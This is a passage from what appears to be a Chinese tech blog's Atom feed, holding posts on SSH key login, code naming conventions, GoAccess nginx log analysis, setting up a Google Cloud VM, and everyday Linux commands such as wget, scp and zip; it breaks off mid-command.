改为 no</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>然后重启 sshd 服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p>以上就是有关如何用自定义的密钥对进行免密认证的全部过程了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="SSH" scheme="https://www.0x2beace.com/tags/SSH/"/>
    
    <category term="SSHD" scheme="https://www.0x2beace.com/tags/SSHD/"/>
    
  </entry>
  
  <entry>
    <title>命名规范——程序员的自我修养</title>
    <link href="https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/"/>
    <id>https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/</id>
    <published>2020-08-28T13:36:57.000Z</published>
    <updated>2020-08-28T13:40:17.879Z</updated>
    
    <content type="html"><![CDATA[<p>之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。</p><a id="more"></a><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h2><p>命名规范包含了：目录、文件、变量、函数命名。<br>值得一提的是：<strong>命名规则没有谁对谁错，在项目中保持一致才是关键。</strong></p><p>混乱或错误的命名不仅让我们对代码难以理解，更糟糕的是，会误导我们的思维，导致对代码的理解完全错误。<br>相反，良好的命名，则可以让我们的代码非常容易读懂，也能向读者正确表达事物以及逻辑的本质，从而使得代码的可维护性就大大增强，读命名好的文章是非常流畅的，会有一种享受的感觉。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>因为Windows，OSX 下文件夹不区分大小写，Linux 是区分的。所以在文件夹的命名上面，建议全部用小写。可以包含下划线(<code>_</code>)或连字符(<code>-</code>)。如果没有约定，(<code>_</code>)更好。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>文件的命名也是推荐和目录的连字符保持一致。Linux 文件系统推荐的文件命名是下划线(<code>_</code>)。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类型名称通常使用大写驼峰命名法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyClass</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="类成员"><a href="#类成员" class="headerlink" title="类成员"></a>类成员</h4><p>不管是静态还是非静态，类数据成员的命名都可以和普通变量一样，采用驼峰命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123;</span><br><span class="line">    public $myVariable;</span><br><span class="line">    public static $myStaticVariable;</span><br><span class="line">    </span><br><span class="line">    public function myFunction($firstWord, $secondWord)&#123;</span><br><span class="line">        &#x2F;&#x2F;方法中的参数名推荐使用小驼峰命名法</span><br><span class="line">        ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一般名称的前缀都是有第一规律的，如is（判断）、get（得到），set（设置）。</p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量的命名有两种方式：</p><ul><li>下划线命名法：my_variable</li><li>小驼峰命名法：myVariable</li></ul><p>但通常还是推荐使用，下划线命名法（全是小写）。</p><blockquote><p>不同的语言也是有不同的规范，例如JavaScript 变量推荐驼峰命名法，CSS 推荐连字符(-)。</p></blockquote><h3 id="常量、全局常量"><a href="#常量、全局常量" class="headerlink" title="常量、全局常量"></a>常量、全局常量</h3><p>常量和全局常量通常使用全大写和下划线的方式来命名，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const MY_CONSTANT;</span><br><span class="line">define(&quot;DEFAULT_NUM&quot;, 10);</span><br></pre></td></tr></table></figure><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;引用变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局变量</span><br></pre></td></tr></table></figure><h3 id="函数命名"><a href="#函数命名" class="headerlink" title="函数命名"></a>函数命名</h3><p>函数的命名使用下划线命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function my_function()&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h4><p>函数和方法的区别：<br>函数是一段可以重用的代码块，方法是在类里面的函数。</p><p>参考链接：</p><ul><li><a href="https://www.cnblogs.com/rainman/p/3756521.html" target="_blank" rel="noopener">PHP 命名规范</a></li><li><a href="https://www.zhihu.com/question/21440067" target="_blank" rel="noopener">如何优雅的为变量和函数命名</a></li><li><a href="https://zh-google-styleguide.readthedocs.io/en/latest/" target="_blank" rel="noopener">命名约定 | Google开源项目风格指南</a></li><li><a href="https://leohxj.gitbooks.io/a-programmer-prepares/programmer-basic/naming.html" target="_blank" rel="noopener">命名规范 | 程序员的自我修养</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。&lt;/p&gt;</summary>
    
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>日志分析工具 - GoAccess</title>
    <link href="https://www.0x2beace.com/log-analysis-tool-goaccess/"/>
    <id>https://www.0x2beace.com/log-analysis-tool-goaccess/</id>
    <published>2020-08-27T14:59:41.000Z</published>
    <updated>2020-11-09T00:28:06.901Z</updated>
    
    <content type="html"><![CDATA[<p>日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。</p><a id="more"></a><p>很显然我完全忽视了它的强大性，就拿 nginx 的访问日志来说，可以从中分析出如下信息：</p><ol><li>请求的响应时间</li><li>请求达到的后端服务器的地址和端口</li><li>请求是否存在缓存配置</li><li>请求体、请求头、响应体和响应头的大小等</li><li>客户端的IP 地址、UserAgent 等信息</li><li>自定义变量的内容</li></ol><p>通过这些信息，可以得到响应耗时的请求以及请求量和并发量，从而分析并发原因，这对于应用级别的服务来说是非常重要的。</p><h2 id="GoAccess-是什么"><a href="#GoAccess-是什么" class="headerlink" title="GoAccess 是什么"></a>GoAccess 是什么</h2><p>GoAccess 是一个开源的<strong>实时网络日志分析器</strong>和<strong>交互式查看器</strong>，可以在类 Unix 系统中的终端或通过浏览器运行。 —— GoAccess 官方</p><blockquote><p>为什么选择 GoAccess？</p></blockquote><ol><li><p>因为GoAccess 被设计成一个基于终端的快速日志分析器。它的核心思想是实时快速分析和查看Web服务器统计信息，而无需使用浏览器。同时也可以将输入到HTML 或者 CSV、JSON。</p></li><li><p>GoAccess几乎可以解析任何Web日志格式（Apache，Nginx，Amazon S3，Elastic Load Balancing，CloudFront等）。只需要设置日志格式并根据您的日志运行它。</p></li></ol><h2 id="GoAccess-入门"><a href="#GoAccess-入门" class="headerlink" title="GoAccess 入门"></a>GoAccess 入门</h2><p>昨天在使用 GoAccess 时，踩到了一些坑，导致我一度认为这个工具是不是存在什么Bug。因为在看别人的教程中都是开箱即用。</p><p>下面从安装到使用会一一详细说明。</p><h3 id="安装-GoAccess"><a href="#安装-GoAccess" class="headerlink" title="安装 GoAccess"></a>安装 GoAccess</h3><p>因为服务器的操作系统是 <code>Ubuntu</code>，所以这里以 <code>Ubuntu</code>为例：</p><p> 因为并非所有发行版都提供最新版本的 GoAccess，所以这里使用官方提供的最新稳定版的安装方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $（lsb_release -cs）main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list</span><br><span class="line">$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - </span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><h3 id="确定日志格式"><a href="#确定日志格式" class="headerlink" title="确定日志格式"></a>确定日志格式</h3><p>在计算机安装了GoAccess 之后，要做的第一件事情就是确定访问日志的日志格式，可以在永久设置它们，也可以通过命令行传递他们。</p><p>这里用Nginx 的 access.log 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure><p>方式一，配置<code>.goaccessrc</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.goaccessrc</span><br><span class="line"></span><br><span class="line">time-format %T</span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br><span class="line">log_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^</span><br></pre></td></tr></table></figure><p>方式二，在命令行传递参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T</span><br></pre></td></tr></table></figure><blockquote><p>注意：无论是配置文件还是命令行参数 都不是永远不变的，只是相对于你要监控的日志格式。</p></blockquote><h3 id="运行GoAccess"><a href="#运行GoAccess" class="headerlink" title="运行GoAccess"></a>运行GoAccess</h3><p>方式一，通过<code>-p</code>参数，指定配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log  -p ~&#x2F;.goaccessrc</span><br></pre></td></tr></table></figure><p>方式二，直接在命令行参数中指定日志格式，详情见上面的例子。</p><h4 id="终端输出"><a href="#终端输出" class="headerlink" title="终端输出"></a>终端输出</h4><p>以下提示使用预定义日志格式的日志配置对话框供您选择，然后实时显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log -c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827144401.png" alt=""></p><p>通常选择第三个，通用日志格式（CLF），成功之后就是这样个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151540.png" alt=""></p><p>控制台下的操作方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">* F1或h主要帮助。</span><br><span class="line">* F5重绘主窗口。</span><br><span class="line">* q退出程序，当前窗口或折叠活动模块</span><br><span class="line">* o或ENTER展开所选模块或打开窗口</span><br><span class="line">* 0-9并将Shift + 0所选模块设置为活动状态</span><br><span class="line">* j在展开的模块中向下滚动</span><br><span class="line">* k在扩展模块中向上滚动</span><br><span class="line">* c设置或更改方案颜色</span><br><span class="line">* ^ f在活动模块中向前滚动一个屏幕</span><br><span class="line">* ^ b在活动模块中向后滚动一个屏幕</span><br><span class="line">* TAB迭代模块（转发）</span><br><span class="line">* SHIFT + TAB迭代模块（向后）</span><br><span class="line">* s对活动模块的排序选项</span><br><span class="line">* &#x2F;搜索所有模块（允许正则表达式）</span><br><span class="line">* n找到下一个出现的位置</span><br><span class="line">* g移至屏幕的第一个项目或顶部</span><br><span class="line">* G移动到屏幕的最后一项或底部</span><br></pre></td></tr></table></figure><h4 id="静态HTML-输出"><a href="#静态HTML-输出" class="headerlink" title="静态HTML 输出"></a>静态HTML 输出</h4><p>以下内容分析访问日志并在静态HTML报告中显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html</span><br></pre></td></tr></table></figure><h4 id="实时HTML-输出"><a href="#实时HTML-输出" class="headerlink" title="实时HTML 输出"></a>实时HTML 输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html</span><br></pre></td></tr></table></figure><p>然后用浏览器访问，大概就是这个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151617.png" alt=""></p><h4 id="配置文件及日志格式说明"><a href="#配置文件及日志格式说明" class="headerlink" title="配置文件及日志格式说明"></a>配置文件及日志格式说明</h4><p>GoAccess 的配置文件位于<code>%sysconfdir%/goaccess.conf</code>或<code>~/.goaccessrc</code></p><blockquote><p>其中，%sysconfdir%是 /etc/，/usr/etc/ 或 /usr/local/etc/</p></blockquote><p><code>time-format</code>和<code>date-format</code>的格式通常都是固定的，只有<code>log-format</code>的格式视具体日志格式而定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %T</span><br><span class="line"></span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br></pre></td></tr></table></figure><p><code>log-format</code>常用格式说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* %x与时间格式和日期格式变量匹配的日期和时间字段。当给出时间戳而不是日期和时间在两个单独的变量中时使用。</span><br><span class="line">* %t时间字段匹配时间格式变量。</span><br><span class="line">* %d与日期格式变量匹配的日期字段。</span><br><span class="line">* %v服务器名称根据规范名称设置（服务器块或虚拟主机）。</span><br><span class="line">* %e这是HTTP身份验证确定的请求文档的人的用户标识。</span><br><span class="line">* %hhost（客户端IP地址，IPv4或IPv6）</span><br><span class="line">* %r来自客户端的请求行。这需要围绕请求的特定分隔符（单引号，双引号等）可解析。否则，使用特殊的格式说明符，如组合%m，%U，%q和%H解析各个字段。</span><br><span class="line">注意：使用或者%r获得完整的请求OR %m，%U，%q并%H形成你的要求，不要同时使用。</span><br><span class="line">* %m请求方法。</span><br><span class="line">* %U请求的URL路径。</span><br><span class="line">注意：如果查询字符串在%U，则无需使用%q。但是，如果URL路径不包含任何查询字符串，则可以使用%q并将查询字符串附加到请求中。</span><br><span class="line">* %q查询字符串。</span><br><span class="line">* %H请求协议。</span><br><span class="line">* %s服务器发送回客户端的状态代码。</span><br><span class="line">* %b返回给客户端的对象大小。</span><br><span class="line">* %R“Referer”HTTP请求标头。</span><br><span class="line">* %u用户代理HTTP请求标头。</span><br><span class="line">* %D服务请求所需的时间，以微秒为单位。</span><br><span class="line">* %T服务请求所需的时间，以毫秒为单位，分辨率为毫秒。</span><br><span class="line">* %L 服务请求所用的时间，以毫秒为单位的十进制数。</span><br><span class="line">* %^忽略此字段。</span><br><span class="line">* %~向前移动日志字符串，直到找到非空格（！isspace）char。</span><br><span class="line">* ~h X-Forwarded-For（XFF）字段中的主机（客户端IP地址，IPv4或IPv6）。</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><ul><li><code>-f</code>：指定需要分析的日志文件路径</li><li><code>-c</code>：程序启动时提示日志/日期配置窗口</li><li><code>-p</code>：指定要使用的自定义配置文件</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器</li><li><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</li><li><code>-a</code>：按主机启用用户代理列表。为了更快地解析，请不要启用此标志</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器。</li></ul><p>总结：GoAccess 从安装到使用还是非常方便的，不仅可以对历史的日志进行分析，也能实时对日志进行分析，所支持的日志格式基本能满足大多数应用场景。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://goaccess.io/" target="_blank" rel="noopener">GoAccess 官网</a></li><li><a href="https://goaccess.io/get-started" target="_blank" rel="noopener">GoAccess 入门</a></li><li><a href="https://www.jianshu.com/p/c6310332f411" target="_blank" rel="noopener">使用GoAccess 分析Nginx 日志</a></li><li><a href="https://github.com/stockrt/nginx2goaccess" target="_blank" rel="noopener">将Nginx log_format转换为goaccess配置文件</a></li><li><a href="https://serverfault.com/questions/779405/goaccess-date-time-log-format-error" target="_blank" rel="noopener">GoAccess 日志格式转换案例一</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1244" target="_blank" rel="noopener">GoAccess 日志格式转换案例二</a></li><li><a href="https://github.com/allinurl/goaccess/issues/668" target="_blank" rel="noopener">GoAccess 日志格式转换案例三</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1338" target="_blank" rel="noopener">GoAccess 日志格式转换案例四</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
    <category term="GoAccess" scheme="https://www.0x2beace.com/tags/GoAccess/"/>
    
    <category term="Logs" scheme="https://www.0x2beace.com/tags/Logs/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 Google Cloud 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/</id>
    <published>2020-08-26T15:25:21.000Z</published>
    <updated>2020-08-27T06:27:35.489Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。</p><a id="more"></a><h2 id="创建VM-实例"><a href="#创建VM-实例" class="headerlink" title="创建VM 实例"></a>创建VM 实例</h2><ul><li><a href="https://cloud.google.com/" target="_blank" rel="noopener">Google Cloud 官网</a></li><li><a href="https://console.cloud.google.com/" target="_blank" rel="noopener">Google Cloud Platform 控制台</a></li></ul><p>进入控制台，找到 Compute Engine，点击创建实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142145.png" alt=""></p><p>新建虚拟机实例，选择相应的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142211.png" alt=""></p><p>选择操作系统映像，以及磁盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142232.png" alt=""></p><p>基本配置如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142253.png" alt=""></p><p>然后点击创建就可以了。创建成功之后，就可以看到该服务器的IP地址了。</p><p>这里需要注意的是，Google Cloud 的远程连接SSH 的方式与其他平台有所区别。</p><h2 id="创建SSH-连接"><a href="#创建SSH-连接" class="headerlink" title="创建SSH 连接"></a>创建SSH 连接</h2><p>Compute Engine =》元数据 =》SSH 密钥</p><p>找到修改，然后上传你的 SSH Key。</p><p>不知道SSH Key 是什么？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br><span class="line"># 打开终端，输入上面那个命令</span><br><span class="line"># 然后在~&#x2F;.ssh 目录下会生成一个 公钥和私钥</span><br><span class="line"># 将 .pub 结尾的文件打开，复制其中的值，粘贴到Google Cloud 上就可以了。</span><br></pre></td></tr></table></figure><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>使用<code>ssh -i max@35.241.77.3</code> 命令连接，其中 max 是用户名，后面是对应服务器 ip地址。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142317.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cloud.google.com/compute/docs/quickstart-linux" target="_blank" rel="noopener">开启Linux 虚拟机使用快速入门–官网文档</a></li><li><a href="https://zhuanlan.zhihu.com/p/40983101" target="_blank" rel="noopener">GCP（Google Cloud Platform）入门</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>不常用Linux命令</title>
    <link href="https://www.0x2beace.com/not-commonly-used-linux-commands/"/>
    <id>https://www.0x2beace.com/not-commonly-used-linux-commands/</id>
    <published>2020-08-25T12:53:33.000Z</published>
    <updated>2020-08-25T12:54:50.257Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。</p><a id="more"></a><h2 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h2><p>wget 命令用于文件的下载，</p><h5 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 下载Ubuntu 18.04 桌面版和服务端版</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。</p><p>为了解决这个问题，我们可以使用参数-O来指定一个文件名：</p><h5 id="下载单个文件并重命名"><a href="#下载单个文件并重命名" class="headerlink" title="下载单个文件并重命名"></a>下载单个文件并重命名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure><h5 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h5><p>当需要下载比较大的文件时，使用参数<code>-b</code>可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><p>可以使用以下命令来察看下载进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><h2 id="Scp"><a href="#Scp" class="headerlink" title="Scp"></a>Scp</h2><p>scp 命令用于文件传输，在不能使用 XShell 这类工具时，scp能很好的解决文件上传的问题。</p><h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname</span><br></pre></td></tr></table></figure><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scp -r  Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname</span><br></pre></td></tr></table></figure><p>如果存在端口号：</p><p>注意：<code>-P</code>参数是大写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F;</span><br></pre></td></tr></table></figure><p>其中 <code>-r</code> 参数表示目录，<code>username</code> 表示服务器对应用户，<code>@</code> 后面接服务器地址。</p><p>注意：不要直接使用 root 用户，因为总是会提示你权限不足。另外使用非 root 用户时，需要注意文件夹权限的问题。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip 命令用于对文件进行打包处理，也就是我们常说的压缩。文件经压缩之后会生成一个具有<code>.zip</code>扩展名的压缩文件。</p><p>将当前目录的<code>dir</code>目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q example.zip dir</span><br></pre></td></tr></table></figure><p>将当前目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q *</span><br></pre></td></tr></table></figure><p>将指定文件目录的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir</span><br></pre></td></tr></table></figure><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>unzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。</p><p>查看压缩文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip -v dir.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目录下解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unzip 